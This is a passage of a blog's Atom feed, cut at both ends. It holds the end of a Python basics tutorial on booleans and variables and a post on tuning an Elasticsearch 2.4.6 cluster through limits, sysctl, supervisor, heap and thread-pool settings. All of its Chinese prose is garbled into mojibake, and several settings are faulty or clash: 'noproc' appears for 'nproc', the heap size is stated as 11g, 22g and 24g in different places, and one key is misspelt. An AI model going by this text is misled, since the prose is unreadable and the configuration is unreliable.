class="line">\\\t\\</span><br></pre></td></tr></table></figure><p>å¦‚æœå­—ç¬¦ä¸²å†…éƒ¨æœ‰å¾ˆå¤šæ¢è¡Œï¼Œç”¨<code>\n</code>å†™åœ¨ä¸€è¡Œé‡Œä¸å¥½é˜…è¯»ï¼Œä¸ºäº†ç®€åŒ–ï¼ŒPythonå…è®¸ç”¨<code>&#39;&#39;&#39;...&#39;&#39;&#39;</code>çš„æ ¼å¼è¡¨ç¤ºå¤šè¡Œå†…å®¹ï¼Œå¯ä»¥è‡ªå·±è¯•è¯•ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(&apos;&apos;&apos;line1</span><br><span class="line">... line2</span><br><span class="line">... line3&apos;&apos;&apos;)</span><br><span class="line">line1</span><br><span class="line">line2</span><br><span class="line">line3</span><br></pre></td></tr></table></figure><hr><h4 id="å¸ƒå°”å€¼"><a href="#å¸ƒå°”å€¼" class="headerlink" title="å¸ƒå°”å€¼"></a>å¸ƒå°”å€¼</h4><p>å¸ƒå°”å€¼å’Œå¸ƒå°”ä»£æ•°çš„è¡¨ç¤ºå®Œå…¨ä¸€è‡´ï¼Œä¸€ä¸ªå¸ƒå°”å€¼åªæœ‰<code>True</code>ã€<code>False</code>ä¸¤ç§å€¼ï¼Œè¦ä¹ˆæ˜¯<code>True</code>ï¼Œè¦ä¹ˆæ˜¯<code>False</code>ï¼Œåœ¨Pythonä¸­ï¼Œå¯ä»¥ç›´æ¥ç”¨<code>True</code>ã€<code>False</code>è¡¨ç¤ºå¸ƒå°”å€¼ï¼ˆè¯·æ³¨æ„å¤§å°å†™ï¼‰ï¼Œä¹Ÿå¯ä»¥é€šè¿‡å¸ƒå°”è¿ç®—è®¡ç®—å‡ºæ¥ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">print(3 &gt; 2)</span><br><span class="line">print(3 &gt; 5)</span><br><span class="line"></span><br><span class="line">æ‰§è¡Œç»“æœ:</span><br><span class="line">True</span><br><span class="line">False</span><br></pre></td></tr></table></figure><p>å¸ƒå°”å€¼å¯ä»¥ç”¨<code>and</code>ã€<code>or</code>å’Œ<code>not</code>è¿ç®—ã€‚</p><p><code>and</code>è¿ç®—æ˜¯ä¸è¿ç®—ï¼Œåªæœ‰æ‰€æœ‰éƒ½ä¸º<code>True</code>ï¼Œ<code>and</code>è¿ç®—ç»“æœæ‰æ˜¯<code>True</code>ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ä»£ç ç¤ºä¾‹:</span><br><span class="line">print(3 &gt; 2 and 3 &lt; 5)</span><br><span class="line">print(3 &gt; 1 and 3 &lt; 1)</span><br><span class="line"></span><br><span class="line">æ‰§è¡Œç»“æœ</span><br><span class="line">True</span><br><span class="line">False</span><br></pre></td></tr></table></figure><p><code>or</code>è¿ç®—æ˜¯æˆ–è¿ç®—ï¼Œåªè¦å…¶ä¸­æœ‰ä¸€ä¸ªä¸º<code>True</code>ï¼Œ<code>or</code>è¿ç®—ç»“æœå°±æ˜¯<code>True</code>ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ä»£ç ç¤ºä¾‹:</span><br><span class="line"></span><br><span class="line"># å¸ƒå°”å€¼çš„orè¿ç®—</span><br><span class="line">print (True or False)</span><br><span class="line">print (3 &gt; 9 or 3 &lt; 5)</span><br><span class="line"></span><br><span class="line">æ‰§è¡Œç»“æœ:</span><br><span class="line">True</span><br><span class="line">True</span><br></pre></td></tr></table></figure><p><code>not</code>è¿ç®—æ˜¯éè¿ç®—ï¼Œå®ƒæ˜¯ä¸€ä¸ªå•ç›®è¿ç®—ç¬¦ï¼ŒæŠŠ<code>True</code>å˜æˆ<code>False</code>ï¼Œ<code>False</code>å˜æˆ<code>True</code>ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#å¸ƒå°”å€¼çš„Notè¿ç®—</span><br><span class="line"></span><br><span class="line">print(not True)</span><br><span class="line">print(not 3 &gt; 9)</span><br><span class="line"></span><br><span class="line">æ‰§è¡Œç»“æœ:</span><br><span class="line">False</span><br><span class="line">True</span><br></pre></td></tr></table></figure><p>ç©ºå€¼ä¸ä¸ºTrueï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ä»£ç ç¤ºä¾‹:</span><br><span class="line"></span><br><span class="line">a = &quot;&quot;</span><br><span class="line">b = None</span><br><span class="line"></span><br><span class="line">if a:</span><br><span class="line">    print(&quot;a is True&quot;)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;a is False&quot;)</span><br><span class="line"></span><br><span class="line">if b:</span><br><span class="line">    print(&quot;b is True&quot;)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;b is False&quot;)</span><br><span class="line">    </span><br><span class="line">æ‰§è¡Œç»“æœ:</span><br><span class="line"></span><br><span class="line">a is False</span><br><span class="line">b is False</span><br></pre></td></tr></table></figure><hr><h4 id="å˜é‡"><a href="#å˜é‡" class="headerlink" title="å˜é‡"></a>å˜é‡</h4><p>å…³äºå˜é‡å…¶å®éå¸¸ç®€å•,ç”¨è¿‡shellæˆ–è€…å…¶ä»–ä»»ä½•è„šæœ¬è¯­è¨€,ç¼–ç¨‹è¯­è¨€çš„éƒ½å·²ç»éå¸¸ç†Ÿæ‚‰äº†,.ä½†æ˜¯è¿™é‡Œæƒ³è¯´ä¸€ä¸‹pythonä¸­å˜é‡å’Œå†…å­˜åœ°å€ç©ºé—´çš„å…³ç³».</p><p>ä¾‹å¦‚.å½“æˆ‘ä»¬ç»™ä¸€ä¸ªå˜é‡èµ‹å€¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a = &apos;ABC</span><br></pre></td></tr></table></figure><p>æ—¶,Pythonè§£é‡Šå™¨å¹²äº†ä¸¤ä»¶äº‹æƒ…:</p><ol><li>åœ¨å†…å­˜ä¸­åˆ›å»ºäº†ä¸€ä¸ª<code>&#39;ABC&#39;</code>çš„å­—ç¬¦ä¸²ï¼›</li><li>åœ¨å†…å­˜ä¸­åˆ›å»ºäº†ä¸€ä¸ªåä¸º<code>a</code>çš„å˜é‡ï¼Œå¹¶æŠŠå®ƒæŒ‡å‘<code>&#39;ABC&#39;</code>ã€‚</li></ol><p>ä¹Ÿå¯ä»¥æŠŠä¸€ä¸ªå˜é‡<code>a</code>èµ‹å€¼ç»™å¦ä¸€ä¸ªå˜é‡<code>b</code>ï¼Œè¿™ä¸ªæ“ä½œå®é™…ä¸Šæ˜¯æŠŠå˜é‡<code>b</code>æŒ‡å‘å˜é‡<code>a</code>æ‰€æŒ‡å‘çš„æ•°æ®ï¼Œä¾‹å¦‚ä¸‹é¢çš„ä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = &apos;ABC&apos;</span><br><span class="line">b = a</span><br><span class="line">a = &apos;XYZ&apos;</span><br><span class="line">print(b)</span><br></pre></td></tr></table></figure><p>æœ€åä¸€è¡Œæ‰“å°å‡ºå˜é‡<code>b</code>çš„å†…å®¹åˆ°åº•æ˜¯<code>&#39;ABC&#39;</code>å‘¢è¿˜æ˜¯<code>&#39;XYZ&#39;</code>ï¼Ÿå¦‚æœä»æ•°å­¦æ„ä¹‰ä¸Šç†è§£ï¼Œå°±ä¼šé”™è¯¯åœ°å¾—å‡º<code>b</code>å’Œ<code>a</code>ç›¸åŒï¼Œä¹Ÿåº”è¯¥æ˜¯<code>&#39;XYZ&#39;</code>ï¼Œä½†å®é™…ä¸Š<code>b</code>çš„å€¼æ˜¯<code>&#39;ABC&#39;</code>ï¼Œè®©æˆ‘ä»¬ä¸€è¡Œä¸€è¡Œåœ°æ‰§è¡Œä»£ç ï¼Œå°±å¯ä»¥çœ‹åˆ°åˆ°åº•å‘ç”Ÿäº†ä»€ä¹ˆäº‹ï¼š</p><p>æ‰§è¡Œ<code>a = &#39;ABC&#39;</code>ï¼Œè§£é‡Šå™¨åˆ›å»ºäº†å­—ç¬¦ä¸²<code>&#39;ABC&#39;</code>å’Œå˜é‡<code>a</code>ï¼Œå¹¶æŠŠ<code>a</code>æŒ‡å‘<code>&#39;ABC&#39;</code>ï¼š</p><p><img src="https://cdn.liaoxuefeng.com/cdn/files/attachments/0013871830933164ebea9bff3e24a64a1d36c0a6c7d368f000/0" alt="py-var-code-1"></p><p>æ‰§è¡Œ<code>b = a</code>ï¼Œè§£é‡Šå™¨åˆ›å»ºäº†å˜é‡<code>b</code>ï¼Œå¹¶æŠŠ<code>b</code>æŒ‡å‘<code>a</code>æŒ‡å‘çš„å­—ç¬¦ä¸²<code>&#39;ABC&#39;</code>ï¼š</p><p><img src="https://cdn.liaoxuefeng.com/cdn/files/attachments/0013871831797715367a9e297944ca88f362ea3b01efaf7000/0" alt=""></p><p>æ‰§è¡Œ<code>a = &#39;XYZ&#39;</code>ï¼Œè§£é‡Šå™¨åˆ›å»ºäº†å­—ç¬¦ä¸²â€™XYZâ€™ï¼Œå¹¶æŠŠ<code>a</code>çš„æŒ‡å‘æ”¹ä¸º<code>&#39;XYZ&#39;</code>ï¼Œä½†<code>b</code>å¹¶æ²¡æœ‰æ›´æ”¹ï¼š</p><p><img src="https://cdn.liaoxuefeng.com/cdn/files/attachments/00138718324379052e7366c983442ac971699da163cacc7000/0" alt=""></p><p>æ‰€ä»¥ï¼Œæœ€åæ‰“å°å˜é‡<code>b</code>çš„ç»“æœè‡ªç„¶æ˜¯<code>&#39;ABC&#39;</code>äº†ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;pythonæ•°æ®ç±»å‹å’Œå˜é‡&quot;&gt;&lt;a href=&quot;#pythonæ•°æ®ç±»å‹å’Œå˜é‡&quot; class=&quot;headerlink&quot; title=&quot;pythonæ•°æ®ç±»å‹å’Œå˜é‡&quot;&gt;&lt;/a&gt;pythonæ•°æ®ç±»å‹å’Œå˜é‡&lt;/h3&gt;&lt;h4 id=&quot;æ•´æ•°&quot;&gt;&lt;a href=&quot;#æ•´æ•°&quot; class=&quot;headerlink&quot; title=&quot;æ•´æ•°&quot;&gt;&lt;/a&gt;æ•´æ•°&lt;/h4&gt;&lt;p&gt;è¡¨ç¤ºæ•°å­—,åŒ…æ‹¬è´Ÿæ•°,ä¾‹å¦‚: &lt;code&gt;1&lt;/code&gt;ï¼Œ&lt;code&gt;100&lt;/code&gt;ï¼Œ&lt;code&gt;-8080&lt;/code&gt;ï¼Œ&lt;code&gt;0&lt;/code&gt;ï¼Œç­‰ç­‰ã€‚&lt;/p&gt;
&lt;h4 id=&quot;æµ®ç‚¹æ•°&quot;&gt;&lt;a href=&quot;#æµ®ç‚¹æ•°&quot; class=&quot;headerlink&quot; title=&quot;æµ®ç‚¹æ•°&quot;&gt;&lt;/a&gt;æµ®ç‚¹æ•°&lt;/h4&gt;&lt;p&gt;æµ®ç‚¹æ•°ä¹Ÿå°±æ˜¯å°æ•°,å¯ä»¥ç”¨æ•°å­—å†™æ³•,ä¾‹å¦‚&lt;code&gt;1.23&lt;/code&gt;ï¼Œ&lt;code&gt;3.14&lt;/code&gt;ï¼Œ&lt;code&gt;-9.01&lt;/code&gt;ï¼Œç­‰ç­‰.è¦æ³¨æ„çš„æ˜¯åœ¨Pythonä¸­,é™¤æ³•çš„ç»“æœéƒ½æ˜¯æµ®ç‚¹æ•°,å³ä½¿æ˜¯è¢«æ•´é™¤,ä¾‹å¦‚:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;gt;&amp;gt;&amp;gt; 9/3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3.0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;gt;&amp;gt;&amp;gt; type(9/3)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;class &amp;apos;float&amp;apos;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;åœ¨pythonä¸­,è¿˜æœ‰ä¸€ç§é™¤æ³•æ˜¯&lt;code&gt;//&lt;/code&gt;ï¼Œç§°ä¸ºåœ°æ¿é™¤ï¼Œä¸¤ä¸ªæ•´æ•°çš„é™¤æ³•ä»ç„¶æ˜¯æ•´æ•°ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;gt;&amp;gt;&amp;gt; 10 / 3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3.3333333333333335&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;gt;&amp;gt;&amp;gt; 10 // 3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;gt;&amp;gt;&amp;gt; type(10 // 3)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;class &amp;apos;int&amp;apos;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;//&lt;/code&gt;é™¤æ³•åªå–ç»“æœçš„æ•´æ•°éƒ¨åˆ†ï¼Œ%åˆ™è¡¨ç¤ºå–ä½™ï¼Œå¯ä»¥å¾—åˆ°ä¸¤ä¸ªæ•´æ•°ç›¸é™¤çš„ä½™æ•°ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;gt;&amp;gt;&amp;gt; 10 % 3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;hr&gt;
    
    </summary>
    
      <category term="python" scheme="https://jesse.top/categories/python/"/>
    
      <category term="basic" scheme="https://jesse.top/categories/python/basic/"/>
    
    
      <category term="python" scheme="https://jesse.top/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>ESé›†ç¾¤ä¼˜åŒ–</title>
    <link href="https://jesse.top/2019/01/07/elasticsearch/ES%E9%9B%86%E7%BE%A4%E4%BC%98%E5%8C%96%E6%96%87%E6%A1%A3/"/>
    <id>https://jesse.top/2019/01/07/elasticsearch/ESé›†ç¾¤ä¼˜åŒ–æ–‡æ¡£/</id>
    <published>2019-01-07T01:59:58.000Z</published>
    <updated>2019-02-17T09:31:38.017Z</updated>
    
    <content type="html"><![CDATA[<h3 id="ESé›†ç¾¤ä¼˜åŒ–"><a href="#ESé›†ç¾¤ä¼˜åŒ–" class="headerlink" title="ESé›†ç¾¤ä¼˜åŒ–"></a>ESé›†ç¾¤ä¼˜åŒ–</h3><h4 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h4><p>æ—¶é—´:2019å¹´01æœˆ3å·</p><p>æ”¯ä»˜å®äº”ç¦æ´»åŠ¨å‹æµ‹æœŸé—´</p><hr><h4 id="ESé›†ç¾¤æ¶æ„"><a href="#ESé›†ç¾¤æ¶æ„" class="headerlink" title="ESé›†ç¾¤æ¶æ„"></a>ESé›†ç¾¤æ¶æ„</h4><p>elasticsearchç‰ˆæœ¬:2.4.6</p><p>ESé›†ç¾¤æœåŠ¡å™¨: 8å°.å…¶ä¸­5å°16c32g.3å°8c16g</p><p>æœåŠ¡å™¨èŠ‚ç‚¹: mq-master,mq-slave,hsq-es1,hsq-es2,hsq-es3,hsq-es4,hsq-es5,hsq-es6</p><a id="more"></a><hr><h4 id="èµ„æ–™å‚è€ƒ"><a href="#èµ„æ–™å‚è€ƒ" class="headerlink" title="èµ„æ–™å‚è€ƒ"></a>èµ„æ–™å‚è€ƒ</h4><p>å®˜æ–¹èµ„æ–™:<a href="https://www.elastic.co/guide/en/elasticsearch/reference/2.4/modules-threadpool.html" target="_blank" rel="noopener">thread pool</a></p><p>å®˜æ–¹èµ„æ–™:<a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/system-config.html" target="_blank" rel="noopener">ç³»ç»Ÿä¼˜åŒ–</a></p><hr><h4 id="ä¼˜åŒ–æ­¥éª¤"><a href="#ä¼˜åŒ–æ­¥éª¤" class="headerlink" title="ä¼˜åŒ–æ­¥éª¤"></a>ä¼˜åŒ–æ­¥éª¤</h4><ul><li><strong>ç³»ç»Ÿå†…æ ¸ä¼˜åŒ–</strong></li></ul><p><strong>æœ€å¤§æ–‡ä»¶æ‰“å¼€æ•°</strong>è®¾ç½®ä¸º65535è¿˜æ˜¯æœ‰ç‚¹å°.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[work@hsq-es1 elasticsearch]$ grep &quot;65536&quot; hsq_elasticsearch.log.2019-01-02</span><br><span class="line">[2019-01-02 14:17:14,740][WARN ][env                      ] [hsq-es1] max file descriptors [65535] for elasticsearch process likely too low, consider increasing to at least [65536]</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹ä¸º102400.ä¿®æ”¹æ–¹å¼å¦‚ä¸‹:</p><p>1.ç¼–è¾‘ /etc/security/limits.conf:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">* soft noproc  65535</span><br><span class="line">* hard noproc 65535</span><br><span class="line">* soft nofile 102400</span><br><span class="line">* hard nofile 102400</span><br></pre></td></tr></table></figure><p>ç„¶åé€€å‡º,é‡æ–°ç™»å½•shell</p><p>2.å¦‚æœæ˜¯supervisoræ–¹å¼å¯åŠ¨çš„è¿›ç¨‹.è¿˜éœ€è¦ä¿®æ”¹supervisord.confæ–‡ä»¶:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#ä¿®æ”¹ä¸‹é¢ä¸€è¡Œ</span><br><span class="line">minfds=102400                 ; (min. avail startup file descriptors;default 1024)</span><br></pre></td></tr></table></figure><ul><li><strong>è™šæ‹Ÿå†…å­˜</strong>å®šä¹‰äº†è¿›ç¨‹èƒ½æ‹¥æœ‰çš„æœ€å¤šå†…å­˜åŒºåŸŸ.è¿™ä¸ªæ˜¯ESå®˜æ–¹æ–‡æ¡£æ¨èçš„é…ç½®</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[work@hsq-es1 elasticsearch]$ tail -3 /etc/sysctl.conf</span><br><span class="line">fs.file-max=102400</span><br><span class="line"></span><br><span class="line">vm.max_map_count = 262144  #è¿™ä¸€è¡Œé…ç½®</span><br></pre></td></tr></table></figure><ul><li><strong>memlock</strong>æœ€å¤§é”å®šå†…å­˜åœ°å€ç©ºé—´ </li></ul><blockquote><p>memlockè¿™æ­¥ä¼˜åŒ–å®é™…ä¸­æ²¡åš,å½“æ—¶æ²¡å°†pam_limits.soæ–‡ä»¶åŠ å…¥å¯åŠ¨æ–‡ä»¶ä¸­</p></blockquote><p>åœ¨ /etc/security/limits.confä¸­åŠ å…¥å¦‚ä¸‹å†…å®¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* soft memlock unlimited</span><br><span class="line">* hard memlock unlimited</span><br></pre></td></tr></table></figure><blockquote><p>è¦ä½¿limits.confæ–‡ä»¶é…ç½®ç”Ÿæ•ˆï¼Œå¿…é¡»è¦ç¡®ä¿pam_limits.soæ–‡ä»¶è¢«åŠ å…¥åˆ°å¯åŠ¨æ–‡ä»¶ä¸­ã€‚</p></blockquote><p>ç¡®ä¿/etc/pam.d/loginæ–‡ä»¶ä¸­æœ‰å¦‚ä¸‹å†…å®¹:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session required /lib/security/pam_limits.so</span><br></pre></td></tr></table></figure><p>éªŒè¯æ˜¯å¦ç”Ÿæ•ˆ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl localhost:9200/_nodes/stats/process?pretty</span><br></pre></td></tr></table></figure><hr><ul><li><strong>å†…å­˜ä¼˜åŒ–</strong></li></ul><p>ç”±äºæ–°åŠ å…¥çš„esæœåŠ¡å™¨èŠ‚ç‚¹éƒ½æ˜¯16c32gçš„é…ç½®,å†…å­˜åˆ†é…æ€»ç‰©ç†å†…å­˜çš„70%.å¤§æ¦‚æ˜¯22Gå·¦å³.</p><p><strong>1.ç¼–è¾‘ç¯å¢ƒå˜é‡</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/profile</span><br><span class="line"></span><br><span class="line">#å®šä¹‰å¦‚ä¸‹ç¯å¢ƒå˜é‡</span><br><span class="line">export ES_HEAP_SIZE=11g</span><br><span class="line"></span><br><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure><ol start="2"><li>å¦‚æœæ˜¯supervisoræ–¹å¼å¯åŠ¨çš„è¿›ç¨‹,è¿˜éœ€è¦å®šä¹‰supervisoré…ç½®æ–‡ä»¶</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[work@hsq-es1 elasticsearch]$ vim /etc/supervisord/conf.d/elasticsearch.conf</span><br><span class="line"></span><br><span class="line">#åŠ å…¥å¦‚ä¸‹ä¸€è¡Œ:</span><br><span class="line">environment=ES_HEAP_SIZE=22g</span><br><span class="line">environment=MAX_OPEN_FILES=102400</span><br></pre></td></tr></table></figure><p>é€šè¿‡pså‘½ä»¤å¯ä»¥çœ‹åˆ°elasticsearchè¿›ç¨‹çš„æœ€å¤§å†…å­˜æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[work@hsq-es2 ~]$ ps aux | grep elasticsearch</span><br><span class="line">work       782 68.6 62.1 50121636 20372716 ?   Sl   Jan03 925:22 /bin/java -Xms24g -Xmx24g -Djava.awt.headless=true -XX:+UseParNewGC -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyFraction=75 -XX:+UseCMSInitiatingOccupancyOnly -XX:+HeapDumpOnOutOfMemoryError -XX:+DisableExplicitGC -Dfile.encoding=UTF-8 -Djna.nosys=true -Des.path.home=/data/app/elasticsearch-2.4.6 -cp /data/app/elasticsearch-2.4.6/lib/elasticsearch-2.4.6.jar:/data/app/elasticsearch-2.4.6/lib/* org.elasticsearch.bootstrap.Elasticsearch start</span><br></pre></td></tr></table></figure><hr><ul><li><strong>elasticsearchç¨‹åºä¼˜åŒ–</strong></li></ul><p>ç¼–è¾‘elasticsearch.confé…ç½®æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#çº¿ç¨‹æ± çš„é…ç½®###</span><br><span class="line">#fixed ç´¢å¼•çº¿ç¨‹æ± ç±»å‹</span><br><span class="line">threadpool.index.type: fixed</span><br><span class="line">#çº¿ç¨‹æ± å¤§å°,å»ºè®®ç­‰åŒäºCPUæ ¸å¿ƒæ•°</span><br><span class="line">threadpool.index.size: 16</span><br><span class="line">#é˜Ÿåˆ—å¤§å°</span><br><span class="line">threadpool.index.queue_size: 6000</span><br><span class="line"></span><br><span class="line">#æœç´¢ çº¿ç¨‹æ± ç±»å‹</span><br><span class="line"></span><br><span class="line">#æœç´¢çº¿ç¨‹æ± å¤§å°,å»ºè®®2å€çš„CPUæ ¸å¿ƒæ•°</span><br><span class="line">threadpool.search.size: 32</span><br><span class="line"># æœç´¢çº¿ç¨‹æ± ç±»å‹</span><br><span class="line">threadpool.search.type: fixed</span><br><span class="line">#é˜Ÿåˆ—å¤§å°</span><br><span class="line">threadpool.search.queue_size: 6000</span><br><span class="line"></span><br><span class="line">processors: 16</span><br><span class="line"></span><br><span class="line"># # ç¼“å­˜ç±»å‹è®¾ç½®ä¸ºSoft Referenceï¼Œåªæœ‰å½“å†…å­˜ä¸å¤Ÿæ—¶æ‰ä¼šè¿›è¡Œå›æ”¶</span><br><span class="line">index.cache.field.max_size: 50000</span><br><span class="line">index.cache.field.expire: 10m</span><br><span class="line">index.cache.field.type: soft</span><br><span class="line">#</span><br><span class="line"># æŸ¥è¯¢ç¼“å­˜</span><br><span class="line">indices.queries.cache.size: 20%</span><br><span class="line">index.queries.cache.enabled: true</span><br><span class="line"></span><br><span class="line">indices.requests.cache.size: 10%</span><br><span class="line">index.requests.cache.enable: true</span><br><span class="line"></span><br><span class="line">indices.fielddata.cache.size: 20%</span><br><span class="line"></span><br><span class="line"># #é€‚å½“å¢å¤§å†™å…¥bufferå’Œbulké˜Ÿåˆ—é•¿åº¦</span><br><span class="line">indices.memory.index_buffer_size: 15%</span><br><span class="line">thread_pool.bulk.queue_size: 1024</span><br></pre></td></tr></table></figure><hr><ul><li><strong>esé›†ç¾¤èŠ‚ç‚¹ä¼˜åŒ–</strong></li></ul><p>å‚è€ƒå®˜æ–¹æ–‡æ¡£: <a 